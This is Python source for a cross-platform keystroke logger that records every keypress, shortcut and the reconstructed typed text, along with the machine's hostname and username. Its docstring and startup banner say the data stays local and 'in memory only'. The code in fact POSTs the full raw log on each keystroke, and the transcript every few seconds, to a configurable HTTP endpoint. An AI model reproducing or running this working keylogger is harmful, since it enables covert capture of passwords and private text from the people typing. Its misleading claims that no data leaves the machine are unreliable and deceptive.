#!/usr/bin/env python3
"""Precise, local keystroke logger.

Captures keystrokes of the local machine and keeps them in memory only.
Two string attributes hold the data:

    KeyLogger.raw_log     append-only event log (header + one line per event)
    KeyLogger.transcript  reconstructed typed text (rewritten on each refresh)

``key.char`` is used as the source of truth, so case, Caps Lock, AltGr and the
active keyboard layout/language are all captured as actually typed. Runs on
Linux (X11) and Windows. Stop with Ctrl+C or the stop hotkey (default
Ctrl+Alt+Q).
"""

from __future__ import annotations

import argparse
import getpass
import json
import os
import platform
import signal
import socket
import subprocess
import sys
import threading
import unicodedata
from datetime import datetime

import requests
from pynput import keyboard
from pynput.keyboard import Key, KeyCode

KeyEvent = Key | KeyCode


def _key_set(*names: str) -> set[Key]:
    """Return the named Key members that exist on this platform."""
    return {
        member for name in names if (member := getattr(Key, name, None)) is not None
    }


def _special_text() -> dict[Key, str]:
    """Map whitespace keys to the literal text they add to the transcript."""
    pairs = (("enter", "\n"), ("tab", "\t"), ("space", " "))
    return {
        member: value
        for name, value in pairs
        if (member := getattr(Key, name, None)) is not None
    }


CTRL_KEYS = _key_set("ctrl", "ctrl_l", "ctrl_r")
ALT_KEYS = _key_set("alt", "alt_l", "alt_r")
CMD_KEYS = _key_set("cmd", "cmd_l", "cmd_r")
SHIFT_KEYS = _key_set("shift", "shift_l", "shift_r")
ALTGR_KEYS = _key_set("alt_gr")
BACKSPACE = getattr(Key, "backspace", None)
SPECIAL_TEXT = _special_text()

# web README.md data
IP = "localhost"
PORT = "8080"


def _mod_group_label(key: KeyEvent) -> str | None:
    """Return the modifier-group name for a modifier key, else None."""
    if key in CTRL_KEYS:
        return "ctrl"
    if key in ALT_KEYS:
        return "alt"
    if key in CMD_KEYS:
        return "cmd"
    if key in SHIFT_KEYS:
        return "shift"
    if key in ALTGR_KEYS:
        return "altgr"
    return None


def _combo_base(key: KeyEvent) -> str:
    """Return a short, stable token for the non-modifier key inside a chord."""
    if isinstance(key, KeyCode):
        char = key.char
        if char is not None and len(char) == 1:
            code = ord(char)
            if 1 <= code <= 26:  # Ctrl+letter arrives as \x01..\x1a
                return chr(code + 96)
            if code >= 32:
                return char
        if key.vk is not None:
            return "vk_%d" % key.vk
        return "?"
    return getattr(key, "name", None) or str(key)


def _pynput_version() -> str:
    """Return the installed pynput version, or 'unknown'."""
    try:
        import importlib.metadata as md

        return md.version("pynput")
    except Exception:
        return "unknown"


def _keyboard_layout() -> str:
    """Return a best-effort description of the active layout/language, per OS."""
    if sys.platform.startswith("win"):
        return _keyboard_layout_windows()
    if sys.platform == "linux":
        try:
            result = subprocess.run(
                ["setxkbmap", "-query"],
                capture_output=True,
                text=True,
                timeout=2,
            )
            if result.returncode == 0 and result.stdout.strip():
                return " | ".join(
                    line.strip() for line in result.stdout.strip().splitlines()
                )
        except Exception:
            pass
    env_bits = [
        os.environ.get("XKB_DEFAULT_LAYOUT", ""),
        os.environ.get("LANG", ""),
        os.environ.get("LC_ALL", ""),
    ]
    return " ".join(b for b in env_bits if b) or "unknown"


def _keyboard_layout_windows() -> str:
    """Return the active Windows keyboard layout/language via the Win32 API."""
    try:
        import ctypes
        import locale

        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, 0)
        hkl = user32.GetKeyboardLayout(thread_id)
        lang_id = hkl & 0xFFFF
        klid = ctypes.create_unicode_buffer(9)
        user32.GetKeyboardLayoutNameW(klid)
        lang_name = locale.windows_locale.get(lang_id, "")
        return "lang_id=0x%04x %s klid=%s" % (lang_id, lang_name, klid.value)
    except Exception:
        return os.environ.get("LANG", "") or "windows (layout query failed)"


class WebServer:
    """Web Server to send keystrokes data."""

    def __init__(self, ip_address: str, port: str) -> None:
        self._ip_address: str = ip_address
        self._port: str = port

    def send_raw(self, payload: str) -> None:
        """Send RAW keystrokes data."""
        self._send(payload, endpoint="raw")

    def send_text(self, payload: str) -> None:
        """Send TEXT keystrokes data."""
        self._send(payload, endpoint="text")

    def _form_socket(self, endpoint: str) -> str:
        """Web README.md socket url."""
        return f"http://{self._ip_address}:{self._port}/{endpoint}"

    def _send(self, payload: str, endpoint: str) -> None:
        """Send keystrokes to web README.md."""
        try:
            requests.post(
                url=self._form_socket(endpoint),
                data=json.dumps({f"{endpoint}Data" : payload}),
                headers={"Content-Type" : "application/json"}
            )
        except Exception:
            print("Unable to send POST request!!!")


class KeyLogger:
    """Capture keystrokes into two in-memory strings: ``raw_log`` and ``transcript``.

    Attributes:
        raw_log: append-only event log — a header followed by one
            ``[HH:MM:SS.mmm] <token>`` line per key event.
        transcript: the reconstructed typed text, rebuilt in full from
            ``buffer`` on every refresh (Backspace/Enter/Tab applied).
        buffer: the working list of characters ``transcript`` is built from.
    """

    def __init__(
        self,
        echo: bool = False,
        autosave_seconds: float = 5.0,
        stop_hotkey: str = "ctrl+alt+q",
    ) -> None:
        """Configure the logger.

        Args:
            echo: also print each event to stdout as it is captured.
            autosave_seconds: how often to rebuild the transcript snapshot.
            stop_hotkey: chord that stops capture, e.g. ``"ctrl+alt+q"``.
        """
        self.echo: bool = echo
        self.autosave_seconds: float = max(0.5, autosave_seconds)

        self.held: set[KeyEvent] = set()
        self.buffer: list[str] = []
        self.listener: keyboard.Listener | None = None
        self._lock = threading.Lock()
        self._timer: threading.Timer | None = None
        self._stopped: bool = False

        parts = [p.strip().lower() for p in stop_hotkey.split("+") if p.strip()]
        self.stop_mods: set[str] = {p for p in parts if p in ("ctrl", "alt", "cmd")}
        rest = [p for p in parts if p not in ("ctrl", "alt", "cmd", "shift")]
        self.stop_key: str = rest[-1] if rest else ""

        self.raw_log: str = self._build_header() + "\n"
        self.transcript: str = ""
        self._web_server: WebServer = WebServer(IP, PORT)

    def _build_header(self) -> str:
        """Return the session-metadata header that seeds ``raw_log``."""
        try:
            nodename = platform.node() or socket.gethostname()
        except Exception:
            nodename = "?"
        try:
            username = getpass.getuser()
        except Exception:
            username = "?"
        return (
            "# keylog session\n"
            f"# start      : {datetime.now().isoformat(timespec='seconds')}\n"
            f"# host/user  : {nodename} / {username}\n"
            f"# platform   : {platform.platform()}  python {sys.version.split()[0]}\n"
            f"# pynput     : {_pynput_version()}\n"
            f"# layout     : {_keyboard_layout()}\n"
            "# format     : [HH:MM:SS.mmm] <token>   (chars are shown as typed)"
        )

    def _log_event(self, when: datetime, token: str) -> None:
        """Append one timestamped event line to ``raw_log`` (and echo if enabled)."""
        line = "[%s] %s" % (when.strftime("%H:%M:%S.%f")[:-3], token)
        self.raw_log += line + "\n"
        self._web_server.send_raw(self.raw_log)
        if self.echo:
            print(line, flush=True)

    def save_transcript(self, reschedule: bool = True) -> None:
        """Rebuild ``transcript`` from ``buffer``; optionally re-arm the timer."""
        with self._lock:
            self.transcript = unicodedata.normalize("NFC", "".join(self.buffer))
            self._web_server.send_text(self.transcript)
        if reschedule and not self._stopped:
            self._timer = threading.Timer(self.autosave_seconds, self.save_transcript)
            self._timer.daemon = True
            self._timer.start()

    def _active_command_mods(self) -> list[str]:
        """Return held command modifiers (ctrl/alt/cmd), ignoring AltGr.

        AltGr is a layout modifier (and a synthetic Ctrl+Alt on Windows), so
        while it is down Ctrl/Alt are not treated as shortcut modifiers.
        """
        altgr = bool(self.held & ALTGR_KEYS)
        labels: list[str] = []
        if not altgr and self.held & CTRL_KEYS:
            labels.append("ctrl")
        if not altgr and self.held & ALT_KEYS:
            labels.append("alt")
        if self.held & CMD_KEYS:
            labels.append("cmd")
        return labels

    def _shift_held(self) -> bool:
        """Return True if any Shift key is currently down."""
        return bool(self.held & SHIFT_KEYS)

    def _is_stop_hotkey(self, cmd_mods: list[str], key: KeyEvent) -> bool:
        """Return True if ``key`` plus the held modifiers match the stop hotkey."""
        if not self.stop_mods or not self.stop_key:
            return False
        if set(cmd_mods) != self.stop_mods:
            return False
        base = (key.name or "") if isinstance(key, Key) else _combo_base(key).lower()
        return base == self.stop_key

    def on_press(self, key: KeyEvent) -> bool | None:
        """Record a key press and update the transcript buffer.

        Returns False to stop the listener (stop hotkey), otherwise None.
        """
        now = datetime.now()

        if _mod_group_label(key) is not None:
            self.held.add(key)
            return None

        cmd_mods = self._active_command_mods()

        if self._is_stop_hotkey(cmd_mods, key):
            self._log_event(now, "<stop-hotkey>")
            self.stop()
            return False

        if cmd_mods:
            printable = (
                isinstance(key, KeyCode)
                and key.char
                and len(key.char) == 1
                and ord(key.char) >= 32
            )
            # Ctrl+Alt + a printable character is AltGr text, not a shortcut.
            if not (set(cmd_mods) == {"ctrl", "alt"} and printable):
                labels = list(cmd_mods)
                if self._shift_held():
                    labels.append("shift")
                parts = ["<%s>" % lab for lab in labels]
                if isinstance(key, Key):
                    parts.append("<%s>" % (key.name or str(key)))
                else:
                    parts.append(_combo_base(key))
                self._log_event(now, "+".join(parts))
                return None

        if key in SPECIAL_TEXT:
            with self._lock:
                self.buffer.append(SPECIAL_TEXT[key])
            self._log_event(now, "<%s>" % key.name)
            return None

        if BACKSPACE is not None and key == BACKSPACE:
            with self._lock:
                if self.buffer:
                    self.buffer.pop()
            self._log_event(now, "<backspace>")
            return None

        if isinstance(key, Key):
            self._log_event(now, "<%s>" % (key.name or str(key)))
            return None

        char = key.char
        if char is None:
            self._log_event(now, "<vk_%s>" % key.vk)
            return None
        if len(char) == 1 and ord(char) < 32:
            self._log_event(now, "<ctrl-char 0x%02x>" % ord(char))
            return None
        with self._lock:
            self.buffer.append(char)
        self._log_event(now, char)
        return None

    def on_release(self, key: KeyEvent) -> None:
        """Drop ``key`` from the held-modifier set on release."""
        self.held.discard(key)

    def start(self) -> None:
        """Start capturing and block until the logger is stopped."""
        self.save_transcript(reschedule=True)
        with keyboard.Listener(
            on_press=self.on_press, on_release=self.on_release
        ) as listener:
            self.listener = listener
            listener.join()

    def stop(self, *_args: object) -> None:
        """Stop capturing, cancel the timer, and take a final transcript snapshot."""
        if self._stopped:
            return
        self._stopped = True
        if self._timer is not None:
            self._timer.cancel()
        self.save_transcript(reschedule=False)
        if self.listener is not None:
            self.listener.stop()


def main() -> int:
    """Parse arguments, run the logger, and report what was collected."""
    parser = argparse.ArgumentParser(
        description="Precise local keystroke logger (learning pynput)."
    )
    parser.add_argument(
        "--echo", action="store_true", help="also print each event to the terminal"
    )
    parser.add_argument(
        "--autosave",
        type=float,
        default=5.0,
        metavar="SECONDS",
        help="how often to refresh the transcript (default: 5)",
    )
    parser.add_argument(
        "--stop-hotkey",
        default="ctrl+alt+q",
        help="chord that stops the logger (default: ctrl+alt+q)",
    )
    args = parser.parse_args()

    logger = KeyLogger(
        echo=args.echo, autosave_seconds=args.autosave, stop_hotkey=args.stop_hotkey
    )

    for sig_name in ("SIGINT", "SIGTERM", "SIGBREAK"):
        sig = getattr(signal, sig_name, None)
        if sig is not None:
            try:
                signal.signal(sig, lambda *_: logger.stop())
            except (ValueError, OSError, RuntimeError):
                pass

    print("=" * 62)
    print(f"   os         : {platform.system()} {platform.release()}")
    print("   storage    : in memory only (no files written)")
    print(f"   stop with  : Ctrl+C, or {args.stop_hotkey}")
    print("=" * 62)

    try:
        logger.start()
    finally:
        logger.stop()

    raw_lines = logger.raw_log.count("\n")
    print("\nStopped. Collected in memory this session:")
    print(f"   raw_log    : {raw_lines} lines, {len(logger.raw_log)} chars")
    print(f"   transcript : {len(logger.transcript)} chars")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
